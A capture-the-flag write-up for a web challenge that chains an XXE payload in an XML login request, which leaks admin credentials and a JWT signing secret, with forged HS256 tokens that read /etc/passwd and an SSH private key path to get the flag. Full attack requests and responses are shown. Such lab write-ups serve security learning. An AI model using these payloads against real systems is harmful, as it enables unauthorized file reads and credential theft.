# Continuuos
**Category: Web**

Visiting this site presents a login screen:

<img src="images/home.png" width="50%">

Viewing the page source, we can find two interesting things. First, there is a comment talking about a settings file:

```html
<!-- check settings in /var/www/html/conf.xml -->
```

We can come back to that later. Next, the source also shows how the login api works:

```html
<script>
    function myFunction() {
        var user = document.getElementById('username').value;
        var pwd = document.getElementById('password').value;
        var res = new XMLHttpRequest();
        var xml = '<?xml version=\'1.0\'?><document><user>' + user + '</user><pass>' + pwd + '</pass></document>';
        res.open('POST', 'login.php', false);
        res.setRequestHeader('Content-Type', 'application/xml');
        res.send(xml);          
        console.log(res);
        if(res.status == 200){location.reload();}
        else{
        var wrong = document.getElementById('wrong');
        wrong.style.display='block';
    }
}
</script>
```

I can make some manual login requests like this:

```http
POST /login.php HTTP/1.1
Host: alpha.tenable-ctf.io:5678
Content-Type: application/xml
Content-Length: 68

<?xml version='1.0'?><document><user></user><pass></pass></document>
```

```
HTTP/1.1 401 Unauthorized
Date: Tue, 14 Jun 2022 11:02:45 GMT
Server: Apache/2.4.52 (Ubuntu)
Content-Length: 174
Content-Type: text/html; charset=UTF-8

user  or password  is incorrect

please check for errors in your request: 

<?xml version="1.0"?>
<document><user/><pass/></document>
```

We can try an [XML External Entities](https://portswigger.net/web-security/xxe) attack to read the settings file the comment mentioned:

```http
POST /login.php HTTP/1.1
Host: alpha.tenable-ctf.io:5678
Content-Type: application/xml
Content-Length: 154

<?xml version='1.0'?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "/var/www/html/conf.xml"> ]>
<document>
<user>test</user>
<pass>&xxe;</pass>
</document>
```

```http
HTTP/1.1 401 Unauthorized
Date: Tue, 14 Jun 2022 11:05:49 GMT
Server: Apache/2.4.52 (Ubuntu)
Content-Length: 541
Content-Type: text/html; charset=UTF-8

user test or password  is incorrect

please check for errors in your request: 

<?xml version="1.0"?>
<!DOCTYPE replace [
<!ENTITY xxe SYSTEM "/var/www/html/conf.xml">
]>
<document>
<user>test</user>
<pass>
<document>
<credentials>
<user>admin</user>
<pass>Continu321!</pass>
</credentials>
<secret>
455b114503f70382f3ccd427ef45972cd2d35c41ee5abb2173d67d3ec54814f2
</secret>
</document>
</pass>
</document>
```

Now we have the username, `admin` and the password, `Continu321!`. We also have a secret value, `455b114503f70382f3ccd427ef45972cd2d35c41ee5abb2173d67d3ec54814f2`, that it isn't yet clear what it is for.

After logging in, we have access to a dashboard that lets us read logs. The running commands functionality is disabled:

<img src="images/operations.png" width="70%">

The page source shows how the api works:

```html
<script>
  function readlog(){
    //temporarily limited to the operations log.
    var logReqJWT = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJvcGVyYXRpb24iOiJyZWFkbG9nIiwibG9nIjoiL3Zhci9sb2cvb3BlcmF0aW9ucy5sb2ciLCJ0aW1lIjoxNjM5NTgxNjY5fQ.wrdM7FwzrMXVFk74edWYRCabOO0uSp13aIcIaL6hHQ0';
    var res = new XMLHttpRequest();
    res.open('POST','operations.php', false);
    res.send(logReqJWT);
    console.log(res);
    if(res.status == 200){
      document.getElementById('output').value = res.responseText;
    }
  }
</script>
```

The first two sections of the JWT decode as:
```js
{
    "typ":"JWT",
    "alg":"HS256"
}
{
    "operation":"readlog",
    "log":"/var/log/operations.log","time":1639581669
}
```

The API on this page uses a [signed JWT](https://jwt.io/introduction) to ensure we don't tamper with the request and do something like try to read any file other than `operations.log`. But, we did get a `secret` value from the config file, maybe that is what was used to sign the JWT?

I went to https://jwt.io/ to see if I could recreate the JWT the site was using by signing it with the secret value from the config file:

<img src="images/jwt1.png">

And yes, on the left it does provide the base64 string we saw in the page source. This means we can use the token to sign our own requests. I changed the JWT payload to:

```js
{
    "operation":"readlog",
    "log":"/etc/passwd","time":1639581669
}
```
Then generated a new base64 string, `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJvcGVyYXRpb24iOiJyZWFkbG9nIiwibG9nIjoiL2V0Yy9wYXNzd2QiLCJ0aW1lIjoxNjM5NTgxNjY5fQ.4gJdZF4aY1zbpbKNpja2XXEUd30BgEctWbm-pImSYIo`, to be sent as a payload to the operations api:

```http
POST /operations.php HTTP/1.1
Host: alpha.tenable-ctf.io:5678
Content-Length: 163
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJ0aW1lIjoxNjU1MjA0OTA2fQ.vKEE53_7WGis9-8qU0tWP8dhFen5L9DPvCo1T9Dwabo
Connection: close

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJvcGVyYXRpb24iOiJyZWFkbG9nIiwibG9nIjoiL2V0Yy9wYXNzd2QiLCJ0aW1lIjoxNjM5NTgxNjY5fQ.4gJdZF4aY1zbpbKNpja2XXEUd30BgEctWbm-pImSYIo
```

```http
HTTP/1.1 200 OK
Date: Tue, 14 Jun 2022 11:25:33 GMT
Server: Apache/2.4.52 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 970
Connection: close
Content-Type: text/html; charset=UTF-8

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
operations:x:1000:1000::/home/operations:/bin/sh
```

This works, and shows us there is an `operations` user on the system. We can try and read their ssh key by generating a JWT that requests the file `/home/operations/.ssh/id_rsa`.

```http
POST /operations.php HTTP/1.1
Host: alpha.tenable-ctf.io:5678
Content-Length: 185
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJ0aW1lIjoxNjU1MjA0OTA2fQ.vKEE53_7WGis9-8qU0tWP8dhFen5L9DPvCo1T9Dwabo
Connection: close

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJvcGVyYXRpb24iOiJyZWFkbG9nIiwibG9nIjoiL2hvbWUvb3BlcmF0aW9ucy8uc3NoL2lkX3JzYSIsInRpbWUiOjE2Mzk1ODE2Njl9.m1VrNoGKsrnIVKXg4qXL_iGgTtHbtQaNeypnDbNlPWA
```

```http
HTTP/1.1 200 OK
Date: Tue, 14 Jun 2022 11:27:09 GMT
Server: Apache/2.4.52 (Ubuntu)
Content-Length: 23
Connection: close
Content-Type: text/html; charset=UTF-8

flag{a_n1ce_cup_0f_jwt}
```
